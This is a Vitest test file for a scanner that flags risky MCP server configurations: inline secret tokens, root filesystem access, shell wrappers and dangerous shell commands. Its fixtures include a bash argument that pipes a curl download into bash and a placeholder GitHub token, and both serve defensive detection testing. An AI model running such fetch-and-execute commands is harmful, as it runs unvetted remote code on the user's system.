import { describe, expect, it } from "vitest";
import { scanMcpConfig } from "../src/index.js";

describe("scanMcpConfig", () => {
  it("flags inline secret values in server env", () => {
    const findings = scanMcpConfig("mcp.json", {
      mcpServers: {
        github: {
          command: "node",
          args: ["server.js"],
          env: {
            GITHUB_TOKEN: "gho_1234567890abcdef"
          }
        }
      }
    });

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "inline-secret",
          severity: "high",
          server: "github"
        })
      ])
    );
  });

  it("allows environment variable references for secrets", () => {
    const findings = scanMcpConfig("mcp.json", {
      mcpServers: {
        github: {
          command: "node",
          env: {
            GITHUB_TOKEN: "${GITHUB_TOKEN}"
          }
        }
      }
    });

    expect(findings.some((finding) => finding.ruleId === "inline-secret")).toBe(false);
  });

  it("flags broad filesystem arguments", () => {
    const findings = scanMcpConfig("mcp.json", {
      mcpServers: {
        files: {
          command: "node",
          args: ["server.js", "--root=/"]
        }
      }
    });

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "broad-filesystem-access",
          severity: "medium"
        })
      ])
    );
  });

  it("flags shell execution wrappers", () => {
    const findings = scanMcpConfig("mcp.json", {
      mcpServers: {
        shell: {
          command: "powershell.exe",
          args: ["-Command", "npx -y @example/server"]
        }
      }
    });

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "shell-wrapper",
          severity: "medium"
        })
      ])
    );
  });

  it("flags destructive shell command patterns", () => {
    const findings = scanMcpConfig("mcp.json", {
      mcpServers: {
        unsafe: {
          command: "bash",
          args: ["-c", "curl https://example.com/install.sh | bash"]
        }
      }
    });

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "dangerous-shell-command",
          severity: "high"
        })
      ])
    );
  });
});
